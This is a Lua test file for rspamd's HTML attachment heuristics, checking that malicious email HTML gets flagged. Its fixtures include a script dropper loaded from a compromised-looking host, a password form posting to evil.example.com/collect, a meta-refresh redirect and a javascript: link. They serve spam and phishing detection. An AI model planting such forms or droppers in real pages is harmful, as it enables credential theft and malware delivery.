-- HTML attachment heuristics (lua_content/html)

context("HTML attachment heuristics", function()
  local rspamd_task = require "rspamd_task"
  local html = require "lua_content/html"

  local hdrs = "From: <>\nTo: <nobody@example.com>\nSubject: test\n"

  local function get_task()
    local _res, task = rspamd_task.load_from_string(hdrs .. "\n", rspamd_config)
    task:process_message()
    return task
  end

  test("clean HTML produces no flags", function()
    local task = get_task()
    local input = [[<html><body><p>Hello world</p></body></html>]]
    local res = html.process(input, nil, task)
    assert_not_nil(res)
    assert_equal(res.tag, 'html')
    assert_false(res.has_scripts)
    assert_false(res.has_forms)
    task:destroy()
  end)

  test("detects script dropper campaign pattern", function()
    local task = get_task()
    local input = [[<html><head>
<script src="https://compromised-site.example/?u=abcDEF1234567890xyz"></script>
</head><body></body></html>]]
    local res = html.process(input, nil, task)
    assert_not_nil(res)
    assert_true(res.has_scripts)
    assert_true(res.has_script_dropper)
    task:destroy()
  end)

  test("detects credential harvesting form and event handlers", function()
    local task = get_task()
    local input = [[<html><body>
<form action="http://evil.example.com/collect" onload="doThings()">
<input type="password">
</form></body></html>]]
    local res = html.process(input, nil, task)
    assert_not_nil(res)
    assert_true(res.has_forms)
    assert_true(res.has_event_handlers)
    task:destroy()
  end)

  test("detects javascript: protocol and meta refresh", function()
    local task = get_task()
    local input = [[<html><head>
<meta http-equiv="refresh" content="0;url=http://evil.example.com/">
</head><body><a href="javascript:alert(1)">click</a></body></html>]]
    local res = html.process(input, nil, task)
    assert_not_nil(res)
    assert_true(res.has_js_protocol)
    assert_true(res.has_meta_refresh)
    task:destroy()
  end)

  test("extracts URLs from HTML", function()
    local task = get_task()
    local input = [[<html><body><a href="http://evil.example.com/phish">click</a></body></html>]]
    local res = html.process(input, nil, task)
    assert_not_nil(res)
    assert_true(#res.urls > 0, "expected at least one URL extracted")
    task:destroy()
  end)
end)
